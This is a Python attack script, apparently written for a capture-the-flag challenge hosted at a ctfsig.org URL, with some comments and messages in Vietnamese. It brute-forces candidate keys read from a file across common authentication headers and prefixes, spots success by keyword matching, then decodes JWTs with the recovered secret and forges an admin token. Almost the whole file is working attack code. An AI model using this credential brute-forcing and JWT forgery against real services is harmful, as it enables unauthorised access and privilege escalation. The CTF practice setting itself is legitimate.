import requests
import jwt
from jwt import DecodeError, InvalidSignatureError

URL = "https://c106.ctfsig.org/569e5da99f5d5f66fbac71b2e4d340041353add4a2f99114a78f8a23bbba68cf/"

HEADERS_BASE = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json"
}

HEADER_KEYS = [
    "Authorization",
    "X-API-Key",
    "X-Auth-Token",
    "X-Access-Token",
    "Api-Key",
    "Authentication",
    "Token"
]

AUTH_PREFIXES = [
    "Bearer",
    "Token",
    "",  # Trường hợp truyền raw value
]

def read_keys(filename):
    keys = []
    with open(filename, "r") as f:
        for line in f:
            keys.extend([k.strip() for k in line.strip().split(',') if k.strip()])
    return keys

def is_likely_flag(response):
    r = response.lower()
    return any(w in r for w in ['flag', '{', 'sig', 'ctf', 'api_key']) or len(response) > 40

def try_decode_jwt(token, key):
    try:
        decoded = jwt.decode(token, key, algorithms=["HS256"])
        return decoded
    except (InvalidSignatureError, DecodeError, jwt.exceptions.PyJWTError):
        return None

def brute_force_all_headers(keys):
    for key in keys:
        for hname in HEADER_KEYS:
            for prefix in AUTH_PREFIXES:
                headers = HEADERS_BASE.copy()
                value = f"{prefix} {key}".strip()
                headers[hname] = value

                try:
                    resp = requests.get(URL, headers=headers, timeout=5)
                    short = resp.text.strip().replace("\n", " ")[:60]
                    print(f"[{hname}: {value[:15]}...] {resp.status_code} - {short}")

                    if resp.status_code == 200 and is_likely_flag(resp.text):
                        print("\n✅ FLAG FOUND!")
                        print(f"Header: {hname}")
                        print(f"Value: {value}")
                        print(resp.text)
                        return key, hname, value, resp.text

                except Exception as e:
                    print(f"[{hname}: {value[:15]}...] ⚠️ Error: {e}")
    return None, None, None, None

def forge_jwt(secret):
    payload = {"admin": True, "username": "ctfer"}
    forged = jwt.encode(payload, secret, algorithm="HS256")
    print(f"\n🛠️  Forged JWT:\n{forged}")
    return forged

if __name__ == "__main__":
    print("[+] Đọc key từ 'keys.txt'...")
    keys = read_keys("keys3.txt")
    print(f"[+] Tổng cộng {len(keys)} key\n")

    key, hname, value, resp = brute_force_all_headers(keys)

    if key:
        print("\n🔍 Thử decode JWT...")
        for token in keys:
            decoded = try_decode_jwt(token, key)
            if decoded:
                print(f"\n🔓 Giải mã được JWT từ key: {key}")
                print(f"Payload:\n{decoded}")
                forge_jwt(key)
                break
